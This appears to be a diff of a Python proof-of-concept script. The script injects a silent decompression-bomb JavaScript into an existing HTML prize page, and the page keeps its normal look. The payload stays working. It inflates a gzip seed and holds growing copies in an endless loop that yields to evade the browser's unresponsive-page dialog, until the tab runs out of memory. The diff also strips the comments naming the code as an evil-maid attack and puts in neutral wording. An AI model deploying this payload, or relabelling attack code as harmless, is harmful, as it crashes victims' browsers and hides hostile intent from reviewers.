@@ -1,21 +1,9 @@
 #!/usr/bin/env python3
-"""Inject a decompression-bomb script into the prize page, keeping it look-alike.
+"""Insert a script into the prize page without removing its existing markup
 
-The evil-maid does not replace the prize page -- that would be visibly different.
-It injects a script into the ORIGINAL prize.html, so the page renders exactly as
-before (the rickroll image and text), while a background script grows tab memory
-until the browser's out-of-memory guard kills the tab.
-
-The payload is a decompression bomb: a small gzip seed embedded as base64 (a few KB
-inflating to megabytes), inflated on load and held in a growing array. The loop is
-asynchronous (it yields between chunks), so the page never blocks the UI thread and
-never shows the "page unresponsive -- stop it?" dialog, and it prints nothing, so
-the page stays visually identical to the real prize.
-
-Honest scope: browser site-isolation gives each tab its own process with an OOM
-killer, so the realistic effect is a dead TAB, not a dead system. This is a proof
-of concept for CWE-345: unauthenticated storage lets an attacker swap passive
-content for active code the victim runs.
+The script inflates a gzip seed and allocates copies after the page loads
+browser_demo.py runs a bounded copy in Chromium; no test triggers browser OOM
+See attack2/README.md for the attack chain and its proof limits
 """
 import base64
 import gzip
@@ -23,13 +11,12 @@ import gzip
 
 def _gzip_seed(zeros):
     """A gzip stream of `zeros` zero bytes -- tiny on disk, large when inflated."""
-    return gzip.compress(b"\x00" * zeros, compresslevel=9)
+    return gzip.compress(b"\x00" * zeros, compresslevel=9, mtime=0)
 
 
 _SCRIPT = """<script>
-/* PROOF OF CONCEPT -- attack2 evil-maid payload (CWE-345). Silent decompression
-   bomb: a {seed_kib} KiB gzip seed inflates to {unit_mib} MiB per held copy, grown
-   asynchronously until the tab is OOM-killed. No output, so the page looks normal. */
+/* Proof of concept: a {seed_kib} KiB gzip stream expands to {unit_mib} MiB per copy
+   The script leaves the page markup in place; unbounded browser behavior is not verified */
 (function () {{
   var SEED_B64 = "{seed_b64}";
   function b64ToBytes(s) {{
@@ -43,12 +30,12 @@ _SCRIPT = """<script>
     var ab = await new Response(ds.readable).arrayBuffer();
     return new Uint8Array(ab);               // real memory, not sparse
   }}
-  var hold = [];                             // never released -> memory only grows
+  var hold = [];
   window.addEventListener("load", async function () {{
     var unit = await inflate(b64ToBytes(SEED_B64));
     while (true) {{
-      hold.push(unit.slice());               // commit fresh pages of RAM
-      await new Promise(function (r) {{ setTimeout(r, 0); }});   // yield: no "unresponsive" dialog
+      hold.push(unit.slice());
+      await new Promise(function (r) {{ setTimeout(r, 0); }});
     }}
   }});
 }})();
